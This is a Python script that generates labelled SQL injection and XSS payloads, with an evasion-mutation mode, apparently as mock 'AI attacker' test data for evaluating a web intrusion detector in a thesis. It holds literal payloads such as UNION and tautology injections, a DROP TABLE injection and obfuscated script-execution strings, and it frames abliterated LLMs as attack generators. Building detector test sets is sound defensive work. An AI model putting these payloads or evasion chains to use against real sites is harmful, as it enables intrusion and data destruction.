#!/usr/bin/env python3
"""
mock_ai_attacker.py

*** THIS IS A PLACEHOLDER, NOT REAL LLM OUTPUT ***

There is no Ollama / local LLM inference available in this environment,
so this script does NOT run CodeLlama or DeepSeek-R1. It generates
payloads using the same publicly-documented SQLi/XSS technique pool
already used elsewhere in this project (webids23_to_honeypot_log_v9.py,
evasion_resistance_check.py), organized into two PROFILES that
approximate the stylistic difference your thesis design expects:

  --profile normal        Approximates a non-abliterated code model
                           (e.g. CodeLlama as-is): clean, single-technique,
                           textbook-shaped payloads. Low mutation.

  --profile polymorphic   Approximates an abliterated reasoning model
                           (e.g. DeepSeek-R1 abliterated): the SAME
                           underlying techniques, but chained/combined and
                           mutated more heavily so the same semantic attack
                           looks syntactically different almost every call.

WHAT THIS IS NOT:
  - Not a claim about what CodeLlama or DeepSeek-R1 would actually produce
  - Not a novel evasion research contribution -- every technique here is
    already public (OWASP CRS test suite, PayloadsAllTheThings-style)
  - Not a substitute for your real structural hold-out evasion set

HOW TO SWAP IN THE REAL THING LATER:
  This script writes output in the exact same flat list-of-dicts format
  (label, family, profile, payload, source) that the real Ollama pipeline
  should produce. Point 11_evaluate_against_mock_attackers.py (or its
  real-data successor) at real Ollama output with this same schema and
  nothing else needs to change.

USAGE:
  python3 mock_ai_attacker.py --profile normal --count 150 -o mock_codellama_normal.jsonl
  python3 mock_ai_attacker.py --profile polymorphic --count 150 -o mock_deepseek_polymorphic.jsonl
"""

import argparse
import json
import random
import secrets
import sys
from pathlib import Path

from webids23_to_honeypot_log_v9 import (
    SQLI_GENERATORS, XSS_GENERATORS, obfuscate_sqli, obfuscate_xss,
)

# Additional standalone evasion techniques (same pool as evasion_resistance_check.py)
EXTRA_SQLI_TECHNIQUES = [
    lambda rng: "1'%09OR%091=1%09--%09-",
    lambda rng: "1`;DROP TABLE `users`;--",
    lambda rng: "' OR 0x31=0x31--",
    lambda rng: f"1 UNION SELECT 0x{secrets.token_hex(6)},0x{secrets.token_hex(6)}--",
    lambda rng: "'/**/UN/**/ION/**/SEL/**/ECT/**/1,2,3--",
    lambda rng: "1;SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END--",
]
EXTRA_XSS_TECHNIQUES = [
    lambda rng: "<script>eval(atob('YWxlcnQoMSk='))</script>",
    lambda rng: f"<script>String.fromCharCode({','.join(str(ord(c)) for c in 'alert(1)')})</script>",
    lambda rng: "<img src=x oNeRRor=/**/(alert)(1)>",
    lambda rng: "<a href=\"jav&#97;script:alert(1)\">x</a>",
    lambda rng: "<svg><animate onbegin=alert(1) attributeName=x>",
    lambda rng: "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
]


def gen_normal(rng, kind):
    """CodeLlama-normal profile: one clean technique, light/no mutation."""
    if kind == "sqli":
        family = rng.choice(list(SQLI_GENERATORS.keys()))
        payload = SQLI_GENERATORS[family](rng)
        if rng.random() < 0.15:  # light obfuscation, occasional only
            payload = obfuscate_sqli(payload, rng)
    else:
        family = rng.choice(list(XSS_GENERATORS.keys()))
        payload = XSS_GENERATORS[family](rng)
        if rng.random() < 0.15:
            payload = obfuscate_xss(payload, rng)
    return payload, family


def gen_polymorphic(rng, kind):
    """DeepSeek-polymorphic profile: chain 2-3 techniques/mutations together,
    so the same underlying attack looks different almost every call."""
    if kind == "sqli":
        family = rng.choice(list(SQLI_GENERATORS.keys()))
        payload = SQLI_GENERATORS[family](rng)
        # chain multiple mutation passes
        n_passes = rng.randint(1, 3)
        for _ in range(n_passes):
            style = rng.choice(["obfuscate", "extra_technique", "case_scramble"])
            if style == "obfuscate":
                payload = obfuscate_sqli(payload, rng)
            elif style == "extra_technique" and rng.random() < 0.4:
                payload = rng.choice(EXTRA_SQLI_TECHNIQUES)(rng)
            elif style == "case_scramble":
                payload = "".join(c.upper() if rng.random() < 0.5 else c.lower() for c in payload)
    else:
        family = rng.choice(list(XSS_GENERATORS.keys()))
        payload = XSS_GENERATORS[family](rng)
        n_passes = rng.randint(1, 3)
        for _ in range(n_passes):
            style = rng.choice(["obfuscate", "extra_technique"])
            if style == "obfuscate":
                payload = obfuscate_xss(payload, rng)
            elif style == "extra_technique" and rng.random() < 0.4:
                payload = rng.choice(EXTRA_XSS_TECHNIQUES)(rng)
    return payload, family


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--profile", choices=["normal", "polymorphic"], required=True)
    ap.add_argument("--count", type=int, default=150)
    ap.add_argument("--seed", type=int, default=42)
    ap.add_argument("-o", "--output", type=Path, required=True)
    args = ap.parse_args()

    rng = random.Random(args.seed)
    gen_fn = gen_normal if args.profile == "normal" else gen_polymorphic
    source_tag = ("MOCK_codellama_normal_PLACEHOLDER" if args.profile == "normal"
                  else "MOCK_deepseek_polymorphic_PLACEHOLDER")

    seen = set()
    records = []
    attempts = 0
    while len(records) < args.count and attempts < args.count * 20:
        attempts += 1
        kind = rng.choice(["sqli", "xss"])
        payload, family = gen_fn(rng, kind)
        if payload in seen:
            continue
        seen.add(payload)
        records.append({
            "label": 1,
            "attack_type": kind,
            "family": family,
            "profile": args.profile,
            "payload": payload,
            "source": source_tag,
        })

    with open(args.output, "w", encoding="utf-8") as f:
        for r in records:
            f.write(json.dumps(r, ensure_ascii=False) + "\n")

    print(f"[{source_tag}] wrote {len(records)} payloads to {args.output}")
    print(f"  distinct: {len(seen)}/{len(records)}")
    from collections import Counter
    print(f"  attack_type breakdown: {dict(Counter(r['attack_type'] for r in records))}")


if __name__ == "__main__":
    main()
